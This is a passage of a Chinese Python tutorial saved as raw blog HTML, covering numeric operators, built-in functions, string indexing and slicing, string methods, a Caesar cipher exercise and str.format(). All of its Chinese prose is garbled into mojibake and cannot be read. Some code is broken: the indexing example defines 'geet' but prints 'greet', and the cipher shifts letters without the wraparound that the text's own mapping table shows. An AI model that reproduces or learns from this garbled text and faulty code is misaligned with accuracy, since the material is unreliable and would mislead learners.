class="line">#åœ¨python3ä¸­:</span><br><span class="line"></span><br><span class="line">10/4=2.5</span><br><span class="line"></span><br><span class="line">10//4=2</span><br></pre></td></tr></table></figure><h5 id="å¢å¼ºèµ‹å€¼è¿ç®—ç¬¦"><a href="#å¢å¼ºèµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="å¢å¼ºèµ‹å€¼è¿ç®—ç¬¦"></a>å¢å¼ºèµ‹å€¼è¿ç®—ç¬¦</h5><p>æ‰€æœ‰çš„äºŒå…ƒæ•°å­¦æ“ä½œç¬¦(+ã€-ã€<em>ã€/ã€//ã€%ã€</em><em>)éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„å¢å¼ºèµ‹å€¼æ“ä½œç¬¦(+=ã€-=ã€</em>=ã€/=ã€//=ã€%=ã€**=)</p><blockquote><p>x+=3ç­‰ä»·äºx=x+3</p><p>x** =3ç­‰ä»·äºx=x**3</p></blockquote><h5 id="å†…ç½®çš„æ•°å€¼è¿ç®—å‡½æ•°"><a href="#å†…ç½®çš„æ•°å€¼è¿ç®—å‡½æ•°" class="headerlink" title="å†…ç½®çš„æ•°å€¼è¿ç®—å‡½æ•°"></a>å†…ç½®çš„æ•°å€¼è¿ç®—å‡½æ•°</h5><p>Pythonè§£é‡Šå™¨æä¾›äº†ä¸€äº›å†…ç½®å‡½æ•°(ä¸éœ€è¦å¼•ç”¨åº“ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨)ï¼Œåœ¨è¿™äº›å†…ç½®å‡½æ•°ä¹‹ä¸­ï¼Œæœ‰6ä¸ªå‡½æ•°ä¸æ•°å€¼è¿ç®—ç›¸å…³</p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>abs(x)</td><td>xçš„ç»å¯¹å€¼</td></tr><tr><td>divmod(x, y)</td><td>(x//y, x%y)ï¼Œè¾“å‡ºä¸ºäºŒå…ƒç»„å½¢å¼ï¼ˆä¹Ÿç§°ä¸ºå…ƒç»„ç±»å‹ï¼‰</td></tr><tr><td>pow(x, y[, z])</td><td>(x** y)%zï¼Œ[..]è¡¨ç¤ºè¯¥å‚æ•°å¯ä»¥çœç•¥ï¼Œå³ï¼špow(x,y)ï¼Œå®ƒä¸x ** yç›¸åŒ</td></tr><tr><td>round(x[, ndigits])</td><td>å¯¹xå››èˆäº”å…¥ï¼Œä¿ç•™ndigitsä½å°æ•°ã€‚round(x)è¿”å›å››èˆäº”å…¥çš„æ•´æ•°å€¼</td></tr><tr><td>max(x1, x2,  â€¦, xn)</td><td>x1, x2,  â€¦, xnçš„æœ€å¤§å€¼ï¼Œnæ²¡æœ‰é™å®š</td></tr><tr><td>min(x1, x2,  â€¦, xn)</td><td>x1, x2,  â€¦, xnçš„æœ€å°å€¼ï¼Œnæ²¡æœ‰é™å®š</td></tr></tbody></table><p>æ•°å€¼è¿ç®—æ“ä½œç¬¦å¯ä»¥éšå¼åœ°è½¬æ¢è¾“å‡ºç»“æœçš„æ•°å­—ç±»å‹</p><p>ä¾‹å¦‚ï¼Œä¸¤ä¸ªæ•´æ•°é‡‡ç”¨è¿ç®—ç¬¦â€œ/â€çš„é™¤æ³•å°†å¯èƒ½è¾“å‡ºæµ®ç‚¹æ•°ç»“æœ(Python 3)ã€‚</p><p>æ­¤å¤–ï¼Œé€šè¿‡å†…ç½®çš„æ•°å­—ç±»å‹è½¬æ¢å‡½æ•°å¯ä»¥æ˜¾å¼åœ°åœ¨æ•°å­—ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ </p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>int(x)</td><td>å°†xè½¬æ¢ä¸ºæ•´æ•°ï¼Œxå¯ä»¥æ˜¯æµ®ç‚¹æ•°æˆ–å­—ç¬¦ä¸²</td></tr><tr><td>float(x)</td><td>å°†xè½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œxå¯ä»¥æ˜¯æ•´æ•°æˆ–å­—ç¬¦ä¸²</td></tr><tr><td>complex(re[, im])</td><td>ç”Ÿæˆä¸€ä¸ªå¤æ•°ï¼Œå®éƒ¨ä¸ºreï¼Œè™šéƒ¨ä¸ºimï¼Œreå¯ä»¥æ˜¯æ•´æ•°ã€æµ®ç‚¹æ•°æˆ–å­—ç¬¦ä¸²ï¼Œimå¯ä»¥æ˜¯æ•´æ•°æˆ–æµ®ç‚¹æ•°ä½†ä¸èƒ½ä¸ºå­—ç¬¦ä¸²(å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¸éœ€è¦æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°)</td></tr></tbody></table><p>å¤æ•°ä¸èƒ½ç›´æ¥è½¬æ¢ä¸ºå…¶ä»–æ•°å­—ç±»å‹ï¼Œå¯ä»¥é€šè¿‡.realå’Œ.imagå°†å¤æ•°çš„å®éƒ¨æˆ–è™šéƒ¨åˆ†åˆ«è½¬æ¢</p><p>å‡½æ•°ï¼štype(x)ï¼Œè¿”å›xçš„ç±»å‹ï¼Œé€‚ç”¨äºæ‰€æœ‰ç±»å‹çš„åˆ¤æ–­</p><p>ï¼ˆmathåº“åœ¨æ­¤ä¸ä»‹ç»ï¼Œå¹³æ—¶ç”¨å¤„ä¹Ÿä¸å¤§ï¼‰</p><h3 id="å­—ç¬¦ä¸²ç±»å‹åŠå…¶æ“ä½œï¼ˆé‡ç‚¹ï¼‰"><a href="#å­—ç¬¦ä¸²ç±»å‹åŠå…¶æ“ä½œï¼ˆé‡ç‚¹ï¼‰" class="headerlink" title="å­—ç¬¦ä¸²ç±»å‹åŠå…¶æ“ä½œï¼ˆé‡ç‚¹ï¼‰"></a>å­—ç¬¦ä¸²ç±»å‹åŠå…¶æ“ä½œï¼ˆé‡ç‚¹ï¼‰</h3><p>å­—ç¬¦ä¸²æ˜¯å­—ç¬¦çš„åºåˆ—è¡¨ç¤ºï¼Œå¯ä»¥ç”±â€œå•å¼•å·â€œã€â€ åŒå¼•å·â€æˆ–â€ä¸‰å¼•å·â€æ„æˆã€‚</p><p>å•å¼•å·å’ŒåŒå¼•å·å¯ä»¥è¡¨ç¤ºå•è¡Œå­—ç¬¦ä¸²ï¼Œä¸¤è€…ä½œç”¨ç›¸åŒ</p><p>ä¸‰å¼•å·å¯ä»¥è¡¨ç¤ºå•è¡Œæˆ–è€…å¤šè¡Œå­—ç¬¦ä¸²</p><p>å­—ç¬¦ä¸²å¯ä»¥ä¿å­˜åœ¨å˜é‡ä¸­ï¼Œä¹Ÿå¯ä»¥å•ç‹¬å­˜åœ¨ã€‚</p><blockquote><p>ä½¿ç”¨å•å¼•å·æ—¶ï¼ŒåŒå¼•å·å¯ä»¥ä½œä¸ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼›</p><p>ä½¿ç”¨åŒå¼•å·æ—¶ï¼Œå•å¼•å·å¯ä»¥ä½œä¸ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</p><p>ä¸‰å¼•å·å¯ä»¥è¡¨ç¤ºå•è¡Œæˆ–è€…å¤šè¡Œå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²å¯ä»¥ä¿å­˜åœ¨å˜é‡ä¸­ï¼Œä¹Ÿå¯ä»¥å•ç‹¬å­˜åœ¨ã€‚</p></blockquote><p>input()å‡½æ•°<strong>å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹</strong>ï¼Œè¿™æ˜¯è·å¾—ç”¨æˆ·è¾“å…¥çš„å¸¸ç”¨æ–¹å¼</p><p>print()å‡½æ•°å¯ä»¥<strong>ç›´æ¥æ‰“å°å­—ç¬¦ä¸²</strong>ï¼Œè¿™æ˜¯è¾“å‡ºå­—ç¬¦ä¸²çš„å¸¸ç”¨æ–¹å¼ã€‚</p><h4 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h4><p>å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå­—ç¬¦åºåˆ—ï¼šå­—ç¬¦ä¸²æœ€å·¦ç«¯ä½ç½®æ ‡è®°ä¸º0ï¼Œä¾æ¬¡å¢åŠ ã€‚å­—ç¬¦ä¸²ä¸­çš„ç¼–å·å«åšâ€œç´¢å¼•â€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å•ä¸ªç´¢å¼•è¾…åŠ©è®¿é—®å­—ç¬¦ä¸²ä¸­çš„ç‰¹å®šä½ç½®</span></span><br><span class="line"><span class="comment">#æ ¼å¼ä¸º&lt;string&gt;[&lt;ç´¢å¼•&gt;]</span></span><br><span class="line">geet=<span class="string">&quot;Hello John&quot;</span></span><br><span class="line"><span class="built_in">print</span>(greet[<span class="number">2</span>]) <span class="comment">#æ‰“å°ç¬¬ä¸‰ä¸ªl</span></span><br><span class="line"><span class="built_in">print</span>(greet[-<span class="number">2</span>])<span class="comment">#æ‰“å°å€’æ•°ç¬¬äºŒä¸ªh</span></span><br></pre></td></tr></table></figure><blockquote><p>Pythonä¸­å­—ç¬¦ä¸²ç´¢å¼•ä»0å¼€å§‹ï¼Œä¸€ä¸ªé•¿åº¦ä¸ºLçš„å­—ç¬¦ä¸²æœ€åä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯L-1</p><p>PythonåŒæ—¶å…è®¸ä½¿ç”¨è´Ÿæ•°ä»å­—ç¬¦ä¸²å³è¾¹æœ«å°¾å‘å·¦è¾¹è¿›è¡Œåå‘ç´¢å¼•ï¼Œæœ€å³ä¾§ç´¢å¼•å€¼æ˜¯-1</p></blockquote><p>Pythonå­—ç¬¦ä¸²ä¹Ÿæä¾›åŒºé—´è®¿é—®æ–¹å¼ï¼Œé‡‡ç”¨[N: M]æ ¼å¼ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ä¸­ä»Nåˆ°Mï¼ˆä¸åŒ…å«Mï¼‰çš„å­å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ï¼ŒNå’ŒMä¸ºå­—ç¬¦ä¸²çš„ç´¢å¼•åºå·ã€‚</p><p>å¯ä»¥æ··åˆä½¿ç”¨æ­£å‘é€’å¢åºå·å’Œåå‘é€’å‡åºå·ã€‚</p><p>å¦‚æœè¡¨ç¤ºä¸­Mæˆ–è€…Nç´¢å¼•ç¼ºå¤±ï¼Œåˆ™è¡¨ç¤ºå­—ç¬¦ä¸²æŠŠå¼€å§‹æˆ–ç»“æŸç´¢å¼•å€¼è®¾ä¸ºé»˜è®¤å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å­—ç¬¦ä¸²ä»¥Unicodeç¼–ç å­˜å‚¨ï¼Œå› æ­¤ï¼Œå­—ç¬¦ä¸²çš„è‹±æ–‡å­—ç¬¦å’Œä¸­æ–‡å­—ç¬¦éƒ½</span></span><br><span class="line"><span class="comment">#ç®—ä½œ1ä¸ªå­—ç¬¦ã€‚</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name=<span class="string">&quot;python æ˜¯æœ€å¥½çš„è¯­è¨€&quot;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name[<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;p&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(name[<span class="number">2</span>:-<span class="number">4</span>])</span><br><span class="line">thon æ˜¯æœ€</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(name[:<span class="number">6</span>])</span><br><span class="line">python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(name[<span class="number">6</span>:])</span><br><span class="line"> æ˜¯æœ€å¥½çš„è¯­è¨€</span><br></pre></td></tr></table></figure><h4 id="è½¬ä¹‰"><a href="#è½¬ä¹‰" class="headerlink" title="è½¬ä¹‰"></a>è½¬ä¹‰</h4><p>åæ–œæ å­—ç¬¦ï¼ˆ\ï¼‰æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºâ€œè½¬ä¹‰â€ï¼Œå³è¯¥å­—ç¬¦ä¸åé¢ç›¸é‚»çš„ä¸€ä¸ªå­—ç¬¦å…±åŒç»„æˆäº†æ–°çš„å«ä¹‰ã€‚</p><p>ä¾‹å¦‚ï¼š\nè¡¨ç¤ºæ¢è¡Œã€\è¡¨ç¤ºåæ–œæ ã€\â€™è¡¨ç¤ºå•å¼•å·ã€</p><p>\â€è¡¨ç¤ºåŒå¼•å·ã€\tè¡¨ç¤ºåˆ¶è¡¨ç¬¦ï¼ˆTABï¼‰ç­‰ã€‚</p><h4 id="åŸºæœ¬çš„å­—ç¬¦ä¸²æ“ä½œç¬¦"><a href="#åŸºæœ¬çš„å­—ç¬¦ä¸²æ“ä½œç¬¦" class="headerlink" title="åŸºæœ¬çš„å­—ç¬¦ä¸²æ“ä½œç¬¦(*)"></a>åŸºæœ¬çš„å­—ç¬¦ä¸²æ“ä½œç¬¦(*)</h4><table><thead><tr><th><strong>æ“ä½œç¬¦</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td><strong>x + y</strong></td><td>è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²xä¸y</td></tr><tr><td><strong>x * n</strong> <strong>æˆ–</strong>  <strong>n * x</strong></td><td>å¤åˆ¶næ¬¡å­—ç¬¦ä¸²x</td></tr><tr><td><strong>x in s</strong></td><td>å¦‚æœxæ˜¯sçš„å­ä¸²ï¼Œè¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td><strong>str[i]</strong></td><td><strong>ç´¢å¼•ï¼Œè¿”å›ç¬¬iä¸ªå­—ç¬¦</strong></td></tr><tr><td><strong>str[N: M]</strong></td><td><strong>åˆ‡ç‰‡ï¼Œè¿”å›ç´¢å¼•ç¬¬Nåˆ°Mçš„å­ä¸²ï¼Œå…¶ä¸­ä¸åŒ…å«M</strong></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;SkyMirror&quot;</span>+<span class="string">&quot; yyds&quot;</span></span><br><span class="line"><span class="string">&#x27;SkyMirror yyds&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;SkyMirror yyds\n&quot;</span>*<span class="number">4</span>)</span><br><span class="line">SkyMirror yyds</span><br><span class="line">SkyMirror yyds</span><br><span class="line">SkyMirror yyds</span><br><span class="line">SkyMirror yyds</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;yyds&quot;</span> <span class="keyword">in</span> <span class="string">&quot;SkyMirror yyds\n&quot;</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="å†…ç½®çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"><a href="#å†…ç½®çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°" class="headerlink" title="å†…ç½®çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°(*)"></a>å†…ç½®çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°(*)</h4><table><thead><tr><th><strong>å‡½æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td><strong>len(x)</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²xçš„é•¿åº¦</strong></td></tr><tr><td><strong>str(x)</strong></td><td><strong>è¿”å›ä»»æ„ç±»å‹xæ‰€å¯¹åº”çš„å­—ç¬¦ä¸²å½¢å¼</strong></td></tr><tr><td><strong>chr(x)</strong></td><td><strong>è¿”å›Unicodeç¼–ç xå¯¹åº”çš„å•å­—ç¬¦</strong></td></tr><tr><td><strong>ord(x)</strong></td><td><strong>è¿”å›å•å­—ç¬¦è¡¨ç¤ºçš„Unicodeç¼–ç </strong></td></tr><tr><td><strong>hex(x)</strong></td><td><strong>è¿”å›æ•´æ•°xå¯¹åº”åå…­è¿›åˆ¶æ•°çš„å°å†™å½¢å¼å­—ç¬¦ä¸²</strong></td></tr><tr><td><strong>oct(x)</strong></td><td><strong>è¿”å›æ•´æ•°xå¯¹åº”å…«è¿›åˆ¶æ•°çš„å°å†™å½¢å¼å­—ç¬¦ä¸²</strong></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; chr(10004) </span><br><span class="line">&#x27;âœ”&#x27;</span><br><span class="line">&gt;&gt;&gt; ord(&#x27;âœ”&#x27;)   </span><br><span class="line">10004</span><br></pre></td></tr></table></figure><p>å®ä¾‹ï¼š</p><p>å‡¯æ’’å¯†ç æ˜¯å¤ç½—é©¬å‡¯æ’’å¤§å¸ç”¨æ¥å¯¹å†›äº‹æƒ…æŠ¥è¿›è¡ŒåŠ å¯†çš„ç®—æ³•ï¼Œå®ƒé‡‡ç”¨äº†æ›¿æ¢æ–¹æ³•å¯¹ä¿¡æ¯ä¸­çš„æ¯ä¸€ä¸ªè‹±æ–‡å­—ç¬¦å¾ªç¯æ›¿æ¢ä¸ºè¯¥å­—ç¬¦åé¢3ä¸ªå­—ç¬¦ï¼Œå¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><p>â€¢åŸæ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>â€¢å¯†æ–‡ï¼šD E F G H I J K L M N O P Q R S T U V W X Y Z A B C</p><p>ï¼ˆçœ‹åˆ°è¿™é‡Œçš„è¯ï¼Œå…ˆè‡ªå·±ç›²æ‰“ä¸€æ®µä»£ç è¯•è¯•ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å‡¯æ’’å¯†ç åŠ å¯†å™¨</span></span><br><span class="line">plaintext=<span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è¦åŠ å¯†çš„å†…å®¹(è‹±æ–‡ï¼‰ï¼š&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> plaintext:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span>&lt;=m&lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(m)+<span class="number">3</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span>&lt;=m&lt;=<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(m)+<span class="number">3</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä¸å¬è¯æ‹œæ‹œ&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>åœ¨Pythonè§£é‡Šå™¨å†…éƒ¨ï¼Œæ‰€æœ‰æ•°æ®ç±»å‹éƒ½é‡‡ç”¨é¢å‘å¯¹è±¡æ–¹å¼å®ç°ï¼Œå°è£…ä¸ºä¸€ä¸ªç±»ã€‚</p><p>å­—ç¬¦ä¸²ä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼Œå®ƒå…·æœ‰ç±»ä¼¼<a>.b()å½¢å¼çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ã€‚åœ¨é¢å‘å¯¹è±¡å­—å…¸é‡Œï¼Œè¿™ç±»å‡½æ•°è¢«ç§°ä¸ºâ€œæ–¹æ³•â€ã€‚</p><p>å­—ç¬¦ä¸²ç±»å‹å…±åŒ…å«43ä¸ªå†…ç½®æ–¹æ³•ã€‚é‰´äºéƒ¨åˆ†å†…ç½®æ–¹æ³•å¹¶ä¸å¸¸ç”¨ï¼Œé™äºç¯‡å¹…ï¼Œè¿™é‡Œä»…ä»‹ç»15ä¸ªå¸¸ç”¨çš„å†…ç½®æ–¹æ³•ï¼Œ</p><table><thead><tr><th><strong>å‡½æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td><strong>str.lower()</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²strçš„å‰¯æœ¬ï¼Œå…¨éƒ¨å­—ç¬¦å°å†™</strong></td></tr><tr><td><strong>str.upper()</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²strçš„å‰¯æœ¬ï¼Œå…¨éƒ¨å­—ç¬¦å¤§å†™</strong></td></tr><tr><td><strong>str.islower()</strong></td><td><strong>å½“stræ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å°å†™æ—¶ï¼Œè¿”å›Trueï¼Œå¦åˆ™False</strong></td></tr><tr><td><strong>str.isprintable()</strong></td><td><strong>å½“stræ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å¯æ‰“å°çš„ï¼Œè¿”å›Trueï¼Œå¦åˆ™False</strong></td></tr><tr><td><strong>str. isnumeric()</strong></td><td><strong>å½“stræ‰€æœ‰å­—ç¬¦éƒ½æ˜¯æ•°å­—æ—¶ï¼Œè¿”å›Trueï¼Œå¦åˆ™False</strong></td></tr><tr><td><strong>str.isspace()</strong></td><td><strong>å½“stræ‰€æœ‰å­—ç¬¦éƒ½æ˜¯ç©ºæ ¼ï¼Œè¿”å›Trueï¼Œå¦åˆ™False</strong></td></tr><tr><td><strong>str.endswith(suffix[,start[,end]])</strong></td><td><strong>str[start: end]</strong> ä»¥suffixç»“å°¾è¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td><strong>str.startswith(prefix[,  start[, end]])</strong></td><td><strong>str[start: end]</strong> ä»¥suffixå¼€å§‹è¿”å›Trueï¼Œå¦åˆ™è¿”å›False</td></tr><tr><td><strong>str.split(sep=None,  maxsplit=-1)</strong></td><td><strong>è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œç”±stræ ¹æ®sepè¢«åˆ†å‰²çš„éƒ¨åˆ†æ„æˆ</strong></td></tr><tr><td><strong>str.count(sub[,start[,end]])</strong></td><td><strong>è¿”å›str[start: end]ä¸­subå­ä¸²å‡ºç°çš„æ¬¡æ•°</strong></td></tr></tbody></table><table><thead><tr><th><strong>str.replace(old,  new[, count])</strong></th><th><strong>è¿”å›å­—ç¬¦ä¸²strçš„å‰¯æœ¬ï¼Œæ‰€æœ‰oldå­ä¸²è¢«æ›¿æ¢ä¸ºnewï¼Œå¦‚æœcountç»™å‡ºï¼Œåˆ™å‰countæ¬¡oldå‡ºç°è¢«æ›¿æ¢</strong></th></tr></thead><tbody><tr><td><strong>str.center(width[,  fillchar])</strong></td><td><strong>å­—ç¬¦ä¸²å±…ä¸­å‡½æ•°ï¼Œè¯¦è§å‡½æ•°å®šä¹‰</strong></td></tr><tr><td><strong>str.strip([chars])</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²strçš„å‰¯æœ¬ï¼Œå·¦ä¾§å’Œå³ä¾§å»æ‰åœ¨charsä¸­åˆ—å‡ºå­—ç¬¦</strong></td></tr><tr><td><strong>str.zfill(width)</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²strçš„å‰¯æœ¬ï¼Œé•¿åº¦ä¸ºwidthï¼Œä¸è¶³éƒ¨åˆ†åœ¨å·¦ä¾§æ·»0</strong></td></tr><tr><td><strong>str.format()</strong></td><td><strong>è¿”å›å­—ç¬¦ä¸²strçš„ä¸€ç§æ’ç‰ˆæ ¼å¼ï¼ˆé‡è¦ï¼‰</strong></td></tr><tr><td><strong>str.join(iterable)</strong></td><td><strong>è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œç”±ç»„åˆæ•°æ®ç±»å‹iterableå˜é‡çš„æ¯ä¸ªå…ƒç´ ç»„æˆï¼Œå…ƒç´ é—´ç”¨stråˆ†å‰²</strong></td></tr></tbody></table><h4 id="å­—ç¬¦ä¸²ç±»å‹çš„æ ¼å¼åŒ–"><a href="#å­—ç¬¦ä¸²ç±»å‹çš„æ ¼å¼åŒ–" class="headerlink" title="å­—ç¬¦ä¸²ç±»å‹çš„æ ¼å¼åŒ–"></a><strong>å­—ç¬¦ä¸²ç±»å‹çš„æ ¼å¼åŒ–</strong></h4><p>format()æ–¹æ³•çš„åŸºæœ¬ä½¿ç”¨ï¼Œå­—ç¬¦ä¸²æ ¼å¼åŒ–ç”¨äºè§£å†³å­—ç¬¦ä¸²å’Œå˜é‡åŒæ—¶è¾“å‡ºæ—¶çš„æ ¼å¼å®‰æ’ã€‚</p><blockquote><p>å­—ç¬¦ä¸²format()æ–¹æ³•çš„åŸºæœ¬ä½¿ç”¨æ ¼å¼æ˜¯ï¼š</p><p>&lt;æ¨¡æ¿å­—ç¬¦ä¸²&gt;.format(&lt;é€—å·åˆ†éš”çš„å‚æ•°&gt;)</p><p>&lt;æ¨¡æ¿å­—ç¬¦ä¸²&gt;ç”±ä¸€ç³»åˆ—çš„æ§½ç»„æˆï¼Œç”¨æ¥æ§åˆ¶ä¿®æ”¹å­—ç¬¦ä¸²ä¸­åµŒå…¥å€¼å‡ºç°çš„ä½ç½®ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯å°†format()æ–¹æ³•çš„&lt;é€—å·åˆ†éš”çš„å‚æ•°&gt;ä¸­çš„å‚æ•°æŒ‰ç…§åºå·å…³ç³»æ›¿æ¢åˆ°&lt;æ¨¡æ¿å­—ç¬¦ä¸²&gt;çš„æ§½ä¸­ã€‚</p></blockquote><p>æ§½ç”¨å¤§æ‹¬å·({})è¡¨ç¤ºï¼Œå¦‚æœå¤§æ‹¬å·ä¸­æ²¡æœ‰åºå·ï¼Œåˆ™æŒ‰ç…§å‡ºç°é¡ºåºæ›¿æ¢</p><p>å¦‚æœå¤§æ‹¬å·ä¸­æŒ‡å®šäº†ä½¿ç”¨å‚æ•°çš„åºå·ï¼ŒæŒ‰ç…§åºå·å¯¹åº”å‚æ•°æ›¿æ¢è°ƒç”¨format()æ–¹æ³•åä¼šè¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå‚æ•°ä»0å¼€å§‹ç¼–å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;1&#125;:è®¡ç®—æœº&#123;0&#125;çš„CPUå ç”¨ç‡ä¸º&#123;2&#125;%ã€‚&quot;.format(&quot;2016-12-31&quot;,&quot;python&quot;,10)</span><br></pre></td></tr></table></figure><p>format()æ–¹æ³•å¯ä»¥éå¸¸æ–¹ä¾¿åœ°è¿æ¥ä¸åŒç±»å‹çš„å˜é‡æˆ–å†…å®¹ï¼Œå¦‚æœéœ€è¦è¾“å‡ºå¤§æ‹¬å·</p><p>format()æ–¹æ³•ä¸­&lt;æ¨¡æ¿å­—ç¬¦ä¸²&gt;çš„æ§½é™¤äº†åŒ…æ‹¬å‚æ•°åºå·ï¼Œè¿˜å¯ä»¥åŒ…æ‹¬æ ¼å¼æ§åˆ¶ä¿¡æ¯ã€‚æ­¤æ—¶ï¼Œæ§½çš„å†…éƒ¨æ ·å¼å¦‚ä¸‹ï¼š{&lt;å‚æ•°åºå·&gt;: &lt;æ ¼å¼æ§åˆ¶æ ‡è®°&gt;} </p><p>å…¶ä¸­ï¼Œ&lt;æ ¼å¼æ§åˆ¶æ ‡è®°&gt;ç”¨æ¥æ§åˆ¶å‚æ•°æ˜¾ç¤ºæ—¶çš„æ ¼å¼</p><p>&lt;æ ¼å¼æ§åˆ¶æ ‡è®°&gt;åŒ…æ‹¬ï¼š&lt;å¡«å……&gt;&lt;å¯¹é½&gt;&lt;å®½åº¦&gt;,&lt;.ç²¾åº¦&gt;&lt;ç±»å‹&gt;6ä¸ªå­—æ®µï¼Œè¿™äº›å­—æ®µéƒ½æ˜¯å¯é€‰çš„ï¼Œå¯ä»¥ç»„åˆä½¿ç”¨ï¼Œè¿™é‡ŒæŒ‰ç…§ä½¿ç”¨æ–¹å¼é€ä¸€ä»‹ç»</p><p><img src="https://img-blog.csdnimg.cn/51fc9af2b3004245999747030d4a26a9.png" 